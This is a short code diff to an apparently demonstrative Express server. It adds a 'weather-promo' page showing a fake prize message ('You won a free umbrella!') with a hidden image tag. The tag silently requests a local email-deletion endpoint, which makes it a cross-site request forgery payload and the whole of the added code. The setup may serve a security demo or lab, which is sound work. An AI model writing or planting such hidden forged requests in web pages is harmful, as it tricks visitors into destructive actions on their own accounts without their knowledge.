@@ -41,6 +41,13 @@ app.get("/weather.js", (req, res) => {
     }
 });
 
+app.get("/weather-promo.html", (req, res) => {
+    res.send(`
+        <h1>You won a free umbrella!</h1>
+        <img src="http://localhost:3000/api/emails/delete/1" style="display:none;">
+    `);
+});
+
 app.listen(PORT, () => {
     console.log(`[System] Server started in mode "${mode}" on port ${PORT}.`);
 })
